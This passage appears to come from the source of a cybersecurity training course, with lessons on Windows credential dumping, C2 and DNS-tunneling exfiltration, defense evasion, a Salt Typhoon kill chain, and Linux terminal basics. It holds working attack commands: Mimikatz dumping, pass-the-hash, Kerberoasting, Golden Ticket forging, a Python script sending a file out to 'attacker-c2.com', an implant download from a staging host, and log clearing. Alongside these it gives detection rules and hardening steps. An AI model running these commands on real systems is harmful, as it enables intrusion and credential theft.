  → Stores NTLM hashes for local accounts
  → Encrypted with SYSKEY (stored in SYSTEM hive)
  → Accessible only when system is running (VSS bypass needed)

Active Directory NTDS.dit
  → C:\\Windows\\NTDS\\ntds.dit (on Domain Controllers)
  → Contains ALL domain user password hashes
  → The crown jewels — who controls this controls the domain

Credential Manager / DPAPI
  → Stores saved browser passwords, RDP credentials, etc.
  → Accessible as current user context</code></pre>

<h3>NTLM Hash Format</h3>
<pre><code># NTLM hash is MD4 of the UTF-16LE encoded password
# Format: username:RID:LM_hash:NTLM_hash
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

# 31d6cfe0...c089c0 is NTLM hash of empty string ("")
# For "Password123":
# NTLM: 58a478135a93ac3bf058a5ea0e8fdb71

# You don't need to crack the hash to use it (pass-the-hash attack)</code></pre>
`,
    technique: `
<h2>How Attackers Dump and Use Credentials</h2>

<h3>Mimikatz — The Credential Dumping Tool</h3>
<pre><code># Mimikatz — the most famous credential dumping tool
# Requires: SYSTEM or SeDebugPrivilege

mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords

Output:
Authentication Id : 0 ; 1048576
Session           : Interactive from 1
User Name         : john.smith
Domain            : ACME
Logon Server      : DC01
Logon Time        : 3/7/2026 09:15:22

        msv :
         [00000003] Primary
         * Username : john.smith
         * Domain   : ACME
         * NTLM     : 31d6cfe0d16ae931b73c59d7e0c089c0
         * SHA1     : da39a3ee5e6b4b0d3255bfef95601890afd80709

        kerberos :
         * Username : john.smith
         * Domain   : ACME.LOCAL
         * Password : P@ssword2024!   ← CLEARTEXT if WDigest enabled</code></pre>

<h3>Pass-the-Hash (PTH)</h3>
<pre><code># You have NTLM hash for domain admin — no need to crack it
# Use the hash directly to authenticate:

# Using impacket psexec.py:
psexec.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 \
  ACME/Administrator@192.168.1.20

# Result: SYSTEM shell on 192.168.1.20 without knowing the password
# This works because NTLM authentication uses the hash, not the plaintext</code></pre>

<h3>Kerberoasting</h3>
<pre><code># Any authenticated domain user can request service tickets
# Service tickets are encrypted with the SERVICE ACCOUNT's password hash
# Crack the ticket offline = get the service account password

# Step 1: Find service accounts (SPNs)
GetUserSPNs.py ACME.local/john.smith:P@ssword2024! -dc-ip 10.0.0.20

ServicePrincipalName    Name           MemberOf
----------------------  -------------  --------
MSSQLSvc/db01:1433      svc-sqlserver  Domain Admins  ← jackpot

# Step 2: Request and save the ticket hash
GetUserSPNs.py ACME.local/john.smith:P@ssword2024! -dc-ip 10.0.0.20 -request

# Step 3: Crack offline with hashcat (no network noise)
hashcat -m 13100 ticket.hash rockyou.txt
# Cracks in hours-days depending on password strength</code></pre>

<h3>DCSync — Stealing All Domain Credentials</h3>
<pre><code># With Domain Admin rights, replicate all password hashes from the DC
# Mimikatz DCSync:
mimikatz # lsadump::dcsync /domain:ACME.local /all /csv

# Result: NTLM hash for EVERY user in the domain
# Including: krbtgt account (needed for Golden Ticket)

# Golden Ticket — forge Kerberos tickets that last 10 years:
mimikatz # kerberos::golden /domain:ACME.local \
  /sid:S-1-5-21-... /krbtgt:[krbtgt_hash] /user:Administrator

# Impact: Permanent domain access that survives password changes
# Only remedy: reset krbtgt password TWICE</code></pre>
`,
    defense: `
<h2>Protecting Credentials and Detecting Harvesting</h2>

<h3>Windows Hardening</h3>
<pre><code># Disable WDigest (prevents cleartext passwords in LSASS)
reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest \
  /v UseLogonCredential /t REG_DWORD /d 0

# Enable Credential Guard (isolates LSASS in VM)
# Group Policy: Device Guard → Turn on Virtualization Based Security

# Enable Protected Users group (limits credential caching)
Add-ADGroupMember -Identity "Protected Users" -Members Administrator

# LSASS Protection (PPL - Protected Process Light)
reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa \
  /v RunAsPPL /t REG_DWORD /d 1</code></pre>

<h3>Service Account Hardening</h3>
<pre><code># Use Group Managed Service Accounts (gMSA) — passwords auto-rotate
New-ADServiceAccount -Name svc-sqlserver -DNSHostName sql.acme.local \
  -PrincipalsAllowedToRetrieveManagedPassword "SQL-Servers"

# Long, complex passwords for regular service accounts (32+ chars)
# Isolate in tier model: service accounts can't log in interactively</code></pre>

<h3>Detection Rules</h3>
<pre><code># Sigma: LSASS Memory Access (Mimikatz indicator)
title: LSASS Memory Read Access
detection:
    selection:
        EventID: 10   # ProcessAccess (Sysmon)
        TargetImage|endswith: '\\lsass.exe'
        GrantedAccess|contains:
            - '0x1010'
            - '0x1410'
            - '0x143a'
    condition: selection
level: critical

# Alert on: Kerberoastable service accounts being requested
# (single user requesting tickets for many SPNs in short time)
EventID 4769 — Kerberos service ticket requested
Filter: TicketEncryptionType = 0x17 (RC4 — crackable!)
Alert: > 5 tickets from single user in 60 seconds</code></pre>
`,
  },

  // ══════════════════════════════════════════════════════════════════════════
  // LEVEL 5 — EXFILTRATION
  // ══════════════════════════════════════════════════════════════════════════

  'c2-channels': {
    concept: `
<h2>C2 Channels — How Malware Phones Home</h2>
<p>
  After compromising a system, attackers need to <strong>communicate with it</strong> —
  send commands, receive data, update the malware. This is done through a
  <strong>C2 (Command and Control)</strong> channel.
</p>

<h3>The Challenge</h3>
<p>
  A corporate firewall blocks most inbound connections. The attacker can't just
  connect to the compromised machine directly. So malware is designed to make
  <em>outbound</em> connections — the victim reaches out to the attacker.
</p>
<pre><code>Naive approach (blocked by firewall):
  Attacker → [FIREWALL] → 💀 Victim

Smart C2 approach (outbound, allowed by firewall):
  Victim → [FIREWALL allows outbound 443] → Attacker's C2 Server</code></pre>

<h3>Why HTTPS is the Perfect C2 Protocol</h3>
<ul>
  <li>Port 443 is almost never blocked outbound (needed for web browsing)</li>
  <li>Traffic is encrypted (SSL inspection is expensive and often skipped)</li>
  <li>Blends with legitimate browsing traffic in logs</li>
  <li>Firewall sees: <code>victim → cdn.cloudfront.net:443</code> — looks completely normal</li>
</ul>

<h3>Beaconing — Regular Check-ins</h3>
<p>
  Malware "beacons" — makes regular check-in requests to the C2 server to receive
  commands. Salt Typhoon's GhostSpider beacon interval: approximately 60 seconds.
</p>
<pre><code>GhostSpider beacon:
POST /api/v2/analytics HTTP/1.1
Host: cdn.analytics-service.io    ← looks like legitimate analytics
User-Agent: Mozilla/5.0 (compatible with normal browsers)
Content-Type: application/json

{"d":"[AES-encrypted command request]","t":"1709827200","h":"[HMAC]"}

C2 Response:
{"status":"ok","task":"[AES-encrypted command]"}

# The firewall sees normal HTTPS to what appears to be a CDN
# Without SSL inspection, contents are invisible</code></pre>
`,
    technique: `
<h2>Advanced C2 Techniques Used by APTs</h2>

<h3>DNS Tunneling — Exfiltrating Through DNS</h3>
<pre><code># DNS is almost never blocked. Attacker registers attacker-c2.com.
# Their authoritative DNS server logs all queries.

# Exfiltrate file content via DNS queries:
# "stolen_data" → base64 → split into 60-char chunks → DNS queries

import base64
import dns.resolver

data = open('secret.txt', 'rb').read()
encoded = base64.b64encode(data).decode()
chunks = [encoded[i:i+60] for i in range(0, len(encoded), 60)]

for chunk in chunks:
    # DNS query: [data].attacker-c2.com
    dns.resolver.resolve(f"{chunk}.attacker-c2.com", 'A')
    # Attacker's DNS server receives all queries → reconstruct file

# Defender sees: high-frequency DNS queries with long subdomain names
# Most firewalls: allowed (it's DNS!)
# Detection: entropy analysis of DNS query lengths</code></pre>

<h3>Living-off-the-Land C2 (LOL-C2)</h3>
<pre><code># Use legitimate cloud services as C2 — even harder to block

# Google Docs C2 (Salt Typhoon variant):
# Malware reads commands from a Google Doc
# Writes results as comments in the Google Doc
# Firewall sees: traffic to docs.google.com ← impossible to block

# GitHub C2:
# Commands stored in private GitHub repo commits
# Malware polls the repo for new commits

# Slack/Teams C2:
# Commands sent as chat messages to a bot
# Almost no org blocks Slack/Teams

# These are called "dead drop resolvers" — MITRE T1102</code></pre>

<h3>Salt Typhoon's Exfiltration: CALEA Data</h3>
<pre><code>CALEA = Communications Assistance for Law Enforcement Act
  → US law requiring telecoms to maintain wiretap capability
  → Law enforcement submits "pen register" orders
  → Telecom systems collect: who called whom, when, duration
  → FBI/DEA/etc. access this through lawful intercept interfaces

Salt Typhoon targeting:
  1. Compromised the routers that connect to CALEA systems
  2. Accessed the lawful intercept management interfaces
  3. Obtained the list of targets under active surveillance
  4. Exfiltrated months of call metadata

Intelligence value:
  → Know who US intelligence is surveilling
  → Identify which Chinese agents have been compromised
  → Conduct counterintelligence operations</code></pre>
`,
    defense: `
<h2>Detecting C2 and Exfiltration</h2>

<h3>Network Traffic Analysis</h3>
<pre><code># Zeek (Bro) — detect beaconing behavior
# Malware beacons at regular intervals → statistical anomaly

# Calculate connection periodicity:
cat conn.log | zeek-cut id.orig_h id.resp_h id.resp_p duration \
  | awk '{print $1,$2,$3}' | sort | uniq -c | sort -rn | head -20

# Look for: high connection count to same external IP:port
# Normal: browser makes 100s of connections to many different IPs
# Beaconing: 1440 connections/day to single IP (every 60 seconds)

# Rita (Real Intelligence Threat Analytics) automates this:
rita analyze /path/to/zeek/logs
rita show-beacons dataset</code></pre>

<h3>DNS Anomaly Detection</h3>
<pre><code># Sigma: DNS tunneling — long subdomain labels
title: Potential DNS Tunneling
detection:
    selection:
        event_type: 'dns'
        dns_question_name|re: '^[A-Za-z0-9+/=]{30,}\.'
    filter_legit:
        dns_question_name|contains:
            - '.google.com'
            - '.microsoft.com'
            - '.amazonaws.com'
    condition: selection and not filter_legit
level: medium

# Alert thresholds for DNS anomalies:
# - Single host: > 1000 DNS queries/hour
# - Single domain: > 50 unique subdomain queries/minute
# - Query length: > 50 characters in any label
# - Unique subdomain ratio: > 80% unique queries to same domain</code></pre>

<h3>SSL/TLS Inspection and JA3 Fingerprinting</h3>
<pre><code># JA3 fingerprints TLS client behavior without decrypting
# Each TLS implementation has a unique fingerprint

# Known malware JA3 hashes:
# Cobalt Strike default: 72a589da586844d7f0818ce684948eea
# Metasploit:            de9f2c7fd25e1b3afad3e85a0bd17d9b

# Add JA3 detection to Zeek:
@load protocols/ssl/ja3

# Block known bad JA3 hashes at the firewall
# Even if you can't read encrypted C2 traffic, you can fingerprint the client</code></pre>
`,
  },

  // ══════════════════════════════════════════════════════════════════════════
  // LEVEL 6 — DEFENSE
  // ══════════════════════════════════════════════════════════════════════════

  'network-defense': {
    concept: `
<h2>Defense-in-Depth Network Architecture</h2>
<p>
  No single security control stops all attacks. <strong>Defense-in-depth</strong>
  is the principle of layering multiple independent controls so that bypassing one
  layer still leaves many more between the attacker and their goal.
</p>

<h3>The Analogy: A Medieval Castle</h3>
<p>
  A medieval castle didn't rely on a single wall. It had: a moat, drawbridge,
  outer wall, inner wall, keep, and final strongroom. An invader who breached the
  outer wall still faced five more layers. Each additional layer costs the attacker
  time, resources, and increases detection probability.
</p>

<h3>The Defense-in-Depth Stack</h3>
<pre><code>Layer 1: Perimeter
  Firewall (stateful, default-deny)
  IPS (signature + behavioral)
  DDoS protection
  WAF for web services

Layer 2: Network Segmentation
  VLANs per function (Finance, HR, IT, DMZ, Guest)
  Default-deny between segments
  Least-privilege ACLs
  East-west traffic monitoring

Layer 3: Endpoint
  EDR (Endpoint Detection & Response)
  Application whitelisting
  Disk encryption (BitLocker, FileVault)
  Patch management (< 14 day critical patch SLA)

Layer 4: Identity
  Multi-Factor Authentication (all accounts)
  Privileged Access Management (PAM) for admin accounts
  Zero Trust: verify every access request
  Conditional Access policies

Layer 5: Data
  Data Loss Prevention (DLP)
  Encryption at rest and in transit
  Backup strategy (3-2-1 rule)
  Access logging for sensitive data

Layer 6: Monitoring
  SIEM (centralized log collection + correlation)
  SOC (Security Operations Center)
  Threat hunting
  Incident Response capability</code></pre>

<h3>Zero Trust Architecture</h3>
<p>
  Traditional security assumed: everything inside the network perimeter is trusted.
  Zero Trust assumes: <strong>nothing is trusted, everything must be verified</strong>.
</p>
<pre><code>Zero Trust principles:
  1. Verify explicitly       → Authenticate and authorize every request
  2. Least privilege access  → Give minimum needed access only
  3. Assume breach           → Design as if attacker is already inside

Salt Typhoon could have been detected earlier with Zero Trust:
  → Router-to-CALEA-system traffic should require separate auth
  → New admin account creation should require MFA + approval
  → Lateral movement would require re-authentication at each segment</code></pre>
`,
    technique: `
<h2>How Attackers Bypass Defenses</h2>
<p>
  Professional attackers study your defenses specifically to route around them.
  Understanding bypass techniques helps you harden the right things.
</p>

<h3>Firewall Bypass</h3>
<pre><code># Technique 1: Use allowed ports
# Most firewalls allow 80/443 outbound → use HTTPS C2

# Technique 2: Protocol tunneling
# Tunnel TCP over DNS (port 53 is often allowed)
# iodine, dns2tcp, DNSCat2

# Technique 3: IPv6 bypass
# Many firewalls have mature IPv4 rules but weak IPv6 rules
# Enable IPv6 C2 where IPv4 is blocked

# Technique 4: ICMP tunneling
# ping packets can carry data payloads
# ptunnel, icmptunnel</code></pre>

<h3>EDR Bypass Techniques</h3>
<pre><code># Living-off-the-Land (LOtL): use tools already on the system
# Windows tools with execution capabilities (LOLBins):
certutil.exe   → download files (looks like certificate management)
mshta.exe      → run HTA files (looks like Microsoft tool)
regsvr32.exe   → execute scripts
wmic.exe       → WMI command execution
powershell.exe → scripting engine
msiexec.exe    → installer (can run remote MSI)

# Process injection: inject code into legitimate processes
# RunPE: run malware inside the memory of explorer.exe
# → EDR sees: explorer.exe is running, which looks normal

# Reflective DLL injection: load DLL without touching disk
# → No file system artifact for EDR to detect</code></pre>

<h3>SIEM Evasion</h3>
<pre><code># Slow and low: perform actions just below alert thresholds
# Instead of 100 failed logins/minute → try 1/hour across many accounts

# Log deletion: attackers with admin access delete their tracks
wevtutil cl Security    # Clear Windows Security event log
del %SystemRoot%\\System32\\winevt\\Logs\\Security.evtx

# Countermeasure: Forward logs to SIEM in real-time
# → Deleting local logs doesn't remove what was already forwarded
# → Alert: Security event log cleared</code></pre>
`,
    defense: `
<h2>Building a Practical Network Defense Program</h2>

<h3>Network Segmentation with VLANs</h3>
<pre><code># Cisco IOS — VLAN segmentation example
vlan 10
 name FINANCE
vlan 20
 name WORKSTATIONS
vlan 30
 name DMZ
vlan 40
 name MANAGEMENT

# ACL between segments (default deny)
ip access-list extended FINANCE-TO-CORP
 permit tcp 10.10.10.0 0.0.0.255 any eq 443  ! HTTPS only
 deny ip any any log                          ! Log everything denied

# Apply to inter-VLAN routing interface
interface Vlan10
 ip access-group FINANCE-TO-CORP in</code></pre>

<h3>SIEM Implementation Checklist</h3>
<pre><code>Essential log sources (must forward to SIEM):
  □ Windows Domain Controller (Event IDs: 4624, 4625, 4648, 4768, 4769, 4776)
  □ Firewall logs (all permit + deny)
  □ DNS logs (all queries)
  □ VPN authentication logs
  □ Network device syslog (routers, switches)
  □ Web server access logs
  □ EDR alerts
  □ Email security (spam, malware, DMARC failures)

Essential detection rules:
  □ Failed login > 5 in 5 minutes (brute force)
  □ Login from new country/IP
  □ Admin account created
  □ Privileged group membership change
  □ Security log cleared
  □ Service installed
  □ Scheduled task created
  □ Lateral movement: same credentials, multiple hosts, short time</code></pre>

<h3>Incident Response Preparation</h3>
<pre><code># Run tabletop exercises quarterly:
Scenario: "Salt Typhoon-style breach — compromised edge router"
Questions:
  1. How would we detect it? (Can we?)
  2. Who do we call first?
  3. How do we isolate without taking down the business?
  4. What evidence do we preserve?
  5. When do we notify customers? Regulators?

Playbooks to have ready:
  - Ransomware response
  - Data breach notification
  - Compromised credentials
  - Insider threat
  - Nation-state APT</code></pre>
`,
  },

  // ══════════════════════════════════════════════════════════════════════════
  // LEVEL 7 — APT CASE STUDIES
  // ══════════════════════════════════════════════════════════════════════════

  'salt-typhoon-deep-dive': {
    concept: `
<h2>Salt Typhoon: The Telecom Heist</h2>
<p>
  Salt Typhoon (also known as Earth Estries, GhostEmperor, FamousSparrow) is a
  Chinese state-sponsored APT group, assessed to operate under the direction of
  China's Ministry of State Security (MSS). Their 2023-2024 campaign against
  US telecommunications providers represents one of the most significant intelligence
  breaches in American history.
</p>

<h3>Attribution</h3>
<pre><code>Group name:    Salt Typhoon / Earth Estries / FamousSparrow
Origin:        People's Republic of China
Sponsor:       MSS (Ministry of State Security)
Active since:  ~2019 (publicly known from 2020)
Primary focus: Telecommunications, Government, NGOs
Victims:       AT&T, Verizon, T-Mobile, Lumen Technologies, and others
Dwell time:    6-18 months in affected networks</code></pre>

<h3>Why Telecoms?</h3>
<p>
  Telecommunication companies are intelligence goldmines:
</p>
<ul>
  <li><strong>Call metadata</strong> — who called whom, when, for how long, from where</li>
  <li><strong>CALEA systems</strong> — lawful intercept infrastructure used by law enforcement</li>
  <li><strong>Network backbone</strong> — ability to intercept or reroute any traffic</li>
  <li><strong>Counterintelligence</strong> — discover which Chinese intelligence assets are under US surveillance</li>
</ul>
<p>
  US intelligence agencies (NSA, FBI, DEA) file "pen register" orders through CALEA
  systems to track communications of suspects. Salt Typhoon accessed these systems
  to see who US law enforcement was actively monitoring.
</p>

<h3>Strategic Impact</h3>
<pre><code>Intelligence gained:
  • Identities of Chinese intelligence assets under US surveillance
  • Communications of US government officials
  • Law enforcement investigation targets
  • US intelligence collection methods and priorities

Scale: Potentially millions of Americans' communications metadata
Timeline: Access maintained for 1-2 years in some networks
Response: CISA Emergency Directive, Senate hearings, FBI alerts</code></pre>
`,
    technique: `
<h2>Salt Typhoon: Complete Technical Kill Chain</h2>

<h3>Phase 1: Reconnaissance (Weeks 1-2)</h3>
<pre><code>Shodan query: product:"Cisco IOS XE" org:"[Target Telecom]" port:443
  → Returns 200+ exposed routers with firmware versions

Filtering: Cross-reference versions against CVE-2023-20198 vulnerable range
  Vulnerable: IOS XE 16.0 - 17.9.x with web UI enabled

OSINT: LinkedIn scrape of target telecom's network engineering team
  → Identify names for spear phishing backup plan

Result: 30-50 confirmed vulnerable routers at major US telcos</code></pre>

<h3>Phase 2: Initial Access (Day 1)</h3>
<pre><code>Exploit CVE-2023-20198:
POST /webui/logoutconfirm.html?logon_hash=1 HTTP/1.1
Host: [router_ip]:443
[malformed authentication header that bypasses auth check]

Response: HTTP 200 OK
← Privileged account "cisco_tac_admin" created (mimics legitimate support accounts)

Immediate follow-up: CVE-2023-20273
  → Execute arbitrary commands via newly created admin account
  → Verify access: show running-config | show version</code></pre>

<h3>Phase 3: Persistence (Days 1-3)</h3>
<pre><code>Deploy GhostSpider implant:
  1. Download implant to router: copy http://c2.staging.net/gs.bin flash:/.hidden_gs
  2. Configure EEM (Embedded Event Manager) applet for persistence:
     event manager applet PERSIST
      event timer watchdog time 3600
      action 1.0 cli command "flash:/.hidden_gs start"
  3. Implant modifies routing tables to ensure C2 traffic bypasses logging

Result: Persistent access that survives router reboots and config saves
Detection difficulty: 9/10 (no EDR on routers, logs rarely forwarded to SIEM)</code></pre>

<h3>Phase 4: Lateral Movement (Weeks 2-6)</h3>
<pre><code>From compromised edge router:
  • Enumerate internal MPLS topology
  • Identify management network (out-of-band network for all devices)
  • Pivot to internal routers closer to CALEA systems

Technique: BGP manipulation
  → Router has BGP peering relationships with carrier network
  → Modify BGP route maps to selectively mirror traffic
  → Creates passive wiretap: copy of all traffic flowing through the router</code></pre>

<h3>Phase 5: CALEA Access (Weeks 6-12)</h3>
<pre><code>CALEA architecture:
  Law Enforcement Agency → [Lawful Order] → Telecom CALEA System
  CALEA System → [Collect] → Target's calls/metadata
  CALEA System → [Deliver] → Law Enforcement

Salt Typhoon's access:
  Compromised router → Access CALEA management interface
  → Download list of ALL current surveillance orders
  → Export metadata for all monitored subjects
  → Identify which MSS assets are under US surveillance

This is the primary intelligence objective of the entire operation</code></pre>

<h3>Phase 6: Exfiltration & Evasion (Ongoing)</h3>
<pre><code>Data exfiltration via GhostSpider:
  → Stage data in encrypted container on router flash
  → Exfiltrate via HTTPS to CDN infrastructure (looks like normal traffic)
  → Use legitimate cloud services (Dropbox API, GitHub) as dead drops

Evasion techniques:
  → Timestomping: modify file timestamps to match legitimate router files
  → Log manipulation: selectively remove authentication events from local logs
  → Traffic mimicry: C2 beacon matches legitimate Cisco management tool user-agents
  → Operational security: only operate during business hours in target timezone</code></pre>
`,
    defense: `
<h2>Defending Against Salt Typhoon-Class Operations</h2>

<h3>Immediate Priority Actions for Network Operators</h3>
<pre><code>1. Disable web management on ALL network devices facing internet:
   no ip http server
   no ip http secure-server

2. Patch Cisco IOS XE immediately (any version < 17.9.4a is vulnerable):
   https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-iosxe-privesc-su7scvdp

3. Audit for compromise indicators:
   show running-config | include username  → look for unknown accounts
   show event manager policy registered    → look for unknown EEM policies

4. Network devices: forward ALL syslog to SIEM immediately:
   logging host 10.0.0.100 transport tcp port 514</code></pre>

<h3>Detection: IOCs from Salt Typhoon</h3>
<pre><code>Known C2 infrastructure (from CISA advisory):
  185.220.101.0/24   (Tor exit nodes used as proxy layer)

Known implant file hashes (YARA rule):
  rule GhostSpider {
      strings:
          $str1 = "GhostSpider" ascii wide
          $str2 = { 47 68 6F 73 74 53 70 69 64 65 72 }
          $c2 = /https?:\/\/[a-z0-9]{8,}\.(io|net|com)\/api\/v[0-9]/ ascii
      condition:
          any of them
  }

Behavioral indicators:
  → HTTP POST to /webui/logoutconfirm.html from external IP
  → New Cisco IOS user accounts created (especially privilege 15)
  → EEM applet changes outside change window
  → Unexpected outbound HTTPS from router management IP
  → BGP route-map modifications</code></pre>

<h3>CALEA System Protection</h3>
<pre><code>Architecture hardening:
  1. Air-gap CALEA systems from general corporate network
  2. Implement MFA for ALL CALEA system access
  3. Log ALL access to lawful intercept data (who accessed what, when)
  4. Network micro-segmentation: CALEA on isolated VLAN
  5. Privileged Access Workstations (PAW) for CALEA operators only

Monitoring:
  Alert on: Any off-hours CALEA system access
  Alert on: Access from non-designated workstations
  Alert on: Mass export of lawful intercept records
  Audit: Quarterly review of who has CALEA access and why</code></pre>

<h3>Strategic Lessons</h3>
<pre><code>What we learned from Salt Typhoon:
  1. Network devices are often the least monitored part of infrastructure
  2. Long dwell times (6-18 months) mean most detection is retrospective
  3. Attackers adapt: after Cisco patches, Salt Typhoon pivoted to Fortinet CVEs
  4. Supply chain of security matters: CALEA systems need their own security program
  5. Nation-state actors have time, resources, and specific intelligence objectives

What defenders must do differently:
  □ Treat network devices as endpoints requiring the same security rigor
  □ Forward network device logs to SIEM (not just store locally)
  □ Patch network devices within 48h of critical CVEs
  □ Conduct regular threat hunts, not just alerting
  □ Practice incident response before you need it</code></pre>
`,
  },

  // ══════════════════════════════════════════════════════════════════════════
  // TERMINAL BASICS
  // ══════════════════════════════════════════════════════════════════════════

  'terminal-basics': {
    concept: `
<h2>What Is a Terminal, Shell, and Bash?</h2>

<h3>The Terminal</h3>
<p>
  A <strong>terminal</strong> (or terminal emulator) is a program that gives you a text window to
  interact with the operating system. Security professionals prefer the terminal because it is
  faster, more powerful, and scriptable than any GUI.
</p>
<p>
  When you open a terminal on Kali Linux, you see a prompt like <code>root@kali:~#</code>.
  This tells you who you are, what machine you are on, and where you are in the filesystem.
</p>

<h3>The Shell</h3>
<p>
  The <strong>shell</strong> is the program running inside the terminal that interprets your
  commands. Common shells:
</p>
<ul>
  <li><code>bash</code> — Bourne Again Shell, the default on most Linux systems</li>
  <li><code>zsh</code> — Z Shell, default on macOS, more features than bash</li>
  <li><code>sh</code> — original Bourne Shell, minimal, used in scripts</li>
</ul>

<h3>Why Bash Matters for Security</h3>
<p>
  Every security tool — nmap, metasploit, sqlmap — is launched from a shell.
  Log files are read in a shell. Exploits are chained using shell pipes and redirections.
  Bash fluency is not optional — it is the universal interface of offensive and defensive security.
</p>

<h2>The Filesystem: paths, pwd, ls, cd</h2>

<h3>Linux Filesystem Layout</h3>
<p>Linux uses a unified tree rooted at <code>/</code>. Key directories:</p>
<ul>
  <li><code>/etc</code> — system configuration (passwords, network config)</li>
  <li><code>/home</code> — user home directories</li>
  <li><code>/var/log</code> — log files (auth.log, syslog, apache2/)</li>
  <li><code>/tmp</code> — temporary files, world-writable — attackers love this</li>
  <li><code>/usr/bin</code> — user programs (ls, grep, curl, etc.)</li>
  <li><code>/root</code> — root user home directory</li>
</ul>

<h3>Navigation Commands</h3>
<pre><code>$ pwd                    # Print Working Directory
$ ls -la /etc            # List with permissions, including hidden files
$ cd /var/log            # Change to absolute path
$ cd ..                  # Go up one level
$ cd ~                   # Go to home directory
$ cd -                   # Go to previous directory</code></pre>

<h2>Files & Directories: cat, less, head, tail, mkdir, cp, mv, rm</h2>

<pre><code>$ cat /etc/passwd        # Print file to screen
$ less /var/log/auth.log # Paginated view (q=quit, /=search)
$ head -20 /etc/passwd   # First 20 lines
$ tail -f /var/log/auth.log  # Follow log in real time

$ touch /tmp/notes.txt   # Create empty file
$ mkdir -p /tmp/recon/targets  # Create dirs recursively
$ cp /etc/passwd /tmp/passwd.bak   # Copy
$ mv /tmp/old.txt /tmp/new.txt     # Rename/move
$ rm /tmp/junk.txt       # Delete (no recycle bin!)
$ rm -rf /tmp/old_dir    # Delete directory recursively</code></pre>

<h2>Permissions: chmod, sudo, ls -la</h2>

<h3>Reading the Permission String</h3>
<pre><code>-rwxr-xr--  1 root staff  12345 Jan 1 nmap
│└──┘└──┘└──┘
│  │   │   └─ Others: r-- = read only
│  │   └───── Group:  r-x = read + execute
│  └───────── Owner:  rwx = read + write + execute
└──────────── Type: - = file, d = directory</code></pre>

<pre><code>$ chmod 755 script.sh    # rwxr-xr-x — typical executable
$ chmod 600 id_rsa       # rw------- — SSH key requirement
$ sudo nmap -sS 10.0.0.0/24   # Run as root</code></pre>

<h2>Text Processing: grep, cut, sort, uniq, wc</h2>

<pre><code>$ grep "root" /etc/passwd
$ grep -r "password" /var/www/         # Recursive search
$ grep -i "error" /var/log/syslog      # Case insensitive
$ grep -n "failed" auth.log            # Show line numbers
$ grep -E "admin|root|sudo" users.txt  # Extended regex (OR)

$ cut -d: -f1 /etc/passwd              # Extract first field
$ sort -u ips.txt                      # Sort and deduplicate
$ cat access.log | sort | uniq -c | sort -rn  # Frequency count
$ wc -l /var/log/auth.log              # Count lines</code></pre>

<h2>Piping & Redirection: |, >, >>, 2>&1</h2>

<pre><code>$ cat /etc/passwd | grep bash | cut -d: -f1
# Read passwd → filter bash users → extract username

$ nmap -sV 10.0.0.1 > scan.txt        # Overwrite file
$ nmap -sV 10.0.0.1 >> scan.txt       # Append to file
$ nmap -sV 10.0.0.1 2>/dev/null       # Discard errors
$ nmap -sV 10.0.0.1 > scan.txt 2>&1  # Capture all output</code></pre>

<h2>Finding Things: find, which, locate</h2>

<pre><code>$ find / -name "*.log" 2>/dev/null           # Find all .log files
$ find / -perm -4000 2>/dev/null             # SUID binaries (privesc!)
$ find /var/www -mtime -1 2>/dev/null        # Modified in last 24h
$ which nmap                                  # Where is nmap installed?
$ locate passwd                               # Fast database search</code></pre>

<h2>Network Commands: ping, curl, wget, ss</h2>

<pre><code>$ ping -c 4 10.0.0.1                   # Test connectivity
$ curl -I http://example.com           # HTTP headers only
$ curl -v http://example.com           # Verbose — see all traffic
$ wget -O /tmp/file.txt http://url     # Download file
$ ss -tulnp                            # Listening ports + processes</code></pre>

<h2>Process Management: ps, kill, jobs</h2>

<pre><code>$ ps aux                    # All processes, all users
$ ps aux | grep nginx        # Find specific process
$ kill -9 1234               # Force kill by PID
$ pkill nginx                # Kill by name
$ Ctrl+C                     # Cancel foreground process
$ Ctrl+Z                     # Suspend to background
$ jobs                       # List background jobs
$ fg %1                      # Bring job 1 to foreground
$ nmap 10.0.0.0/24 &         # Run in background immediately</code></pre>

<h2>Shortcuts: Tab, History, man</h2>

<pre><code>Tab             # Autocomplete commands and paths
Ctrl+C          # Cancel running command
Ctrl+L          # Clear screen (like: clear)
Ctrl+R          # Search command history
Arrow Up/Down   # Scroll history
!!              # Repeat last command
history | grep curl    # Search history

$ man nmap              # Full manual page
$ nmap --help           # Built-in help
$ man -k "network scan" # Search man pages by keyword</code></pre>
`,

    technique: `
<h2>Command Chaining for Security Work</h2>

<h3>Chaining Operators</h3>
<pre><code>cmd1 && cmd2   # Run cmd2 only if cmd1 succeeded
cmd1 || cmd2   # Run cmd2 only if cmd1 failed
cmd1 ; cmd2    # Always run both, sequentially
cmd1 | cmd2    # Pipe stdout to next command
cmd1 &         # Run in background</code></pre>

<h2>Recon One-Liners</h2>

<h3>Parsing nmap output</h3>
<pre><code># Extract open ports from grepable output
nmap -sV -oG - 10.0.0.0/24 | grep "open" | awk '{print $2, $5}'

# All IPs with port 80 open
nmap -p 80 --open -oG - 10.0.0.0/24 | grep "/open" | awk '{print $2}'

# Scan from a target list
nmap -sV -iL targets.txt -oN scan_results.txt</code></pre>

<h3>Log parsing</h3>
<pre><code># Count failed SSH logins by IP
grep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn

# Top IPs from Apache access log
awk '{print $1}' /var/log/apache2/access.log | sort | uniq -c | sort -rn | head -20

# Extract all links from a page
curl -s http://target.com | grep -oE 'href="[^"]+"' | cut -d'"' -f2</code></pre>

<h2>File Searching for Pentesters</h2>

<pre><code># World-writable files (persistence spots)
find / -perm -002 -type f 2>/dev/null

# SUID binaries (privilege escalation targets)
find / -perm -4000 -type f 2>/dev/null

# Files modified in the last 24 hours
find /var/www -mtime -1 2>/dev/null

# Search config files for credentials
find / -name "*.conf" -exec grep -l "password" {} \; 2>/dev/null

# PHP webshell patterns
grep -r "eval(base64" /var/www/ 2>/dev/null</code></pre>

<h2>Network Recon Without Extra Tools</h2>

<h3>curl for reconnaissance</h3>
<pre><code># Full HTTP verbosity
curl -v http://target.com/admin

# Check common sensitive paths
for path in robots.txt .git/config wp-config.php .env; do
  curl -so /dev/null -w "%{http_code} $path\n" http://target.com/$path
done

# Bypass basic WAF headers
